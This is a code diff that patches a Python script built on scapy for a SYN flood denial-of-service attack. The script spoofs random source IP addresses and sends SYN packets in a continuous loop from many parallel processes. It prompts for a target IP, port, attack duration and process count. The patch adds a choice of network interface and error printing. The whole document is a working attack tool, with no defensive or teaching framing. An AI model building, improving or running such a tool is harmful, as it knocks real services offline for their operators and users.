@@ -7,13 +7,13 @@ import os
 import signal
 import sys
 import multiprocessing
-from scapy.all import IP, TCP, send
+from scapy.all import IP, TCP, send, get_if_addr, conf
 
 def generate_spoofed_ip():
     """Generates a random spoofed IPv4 address."""
     return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
-def syn_flood_worker(target_ip, target_port, running_flag, packet_counter):
+def syn_flood_worker(target_ip, target_port, running_flag, packet_counter, iface):
     """
     Worker function that continuously sends SYN packets directly to the target IP address.
     No MAC resolution required.
@@ -23,10 +23,15 @@ def syn_flood_worker(target_ip, target_port, running_flag, packet_counter):
             src_ip = generate_spoofed_ip()
             src_port = random.randint(1024, 65535)
             packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
-            send(packet, verbose=0)  # Send SYN packet
+            
+            # Send the SYN packet over the specified interface
+            send(packet, verbose=0, iface=iface)
+
+            # Track the number of packets sent
             with packet_counter.get_lock():  # Lock for safe access to shared counter
                 packet_counter.value += 1  # Increment the packet counter
-        except Exception:
+        except Exception as e:
+            print(f"Error sending packet: {e}")
             continue
 
 def main():
@@ -39,11 +44,16 @@ def main():
     target_port = int(input("Enter target port (e.g., 80): ").strip())
     duration = int(input("Enter attack duration in seconds: ").strip())
     num_processes = int(input("Enter number of processes to spawn (e.g., 100): ").strip())
+    iface = input("Enter network interface (e.g., eth0) [optional]: ").strip() or None
+
+    if not iface:
+        iface = conf.iface  # Default to the active interface if none is specified
+        print(f"Using default interface: {iface}")
 
     # Create a shared flag to signal processes to stop.
     manager = multiprocessing.Manager()
     running_flag = manager.Value('i', 1)
-    
+
     # Create a shared counter to track the number of packets sent
     packet_counter = manager.Value('i', 0)
 
@@ -51,7 +61,7 @@ def main():
     print("\n🚀 Starting SYN Flood Attack...")
     for _ in range(num_processes):
         p = multiprocessing.Process(target=syn_flood_worker,
-                                    args=(target_ip, target_port, running_flag, packet_counter))
+                                    args=(target_ip, target_port, running_flag, packet_counter, iface))
         p.start()
         processes.append(p)
 
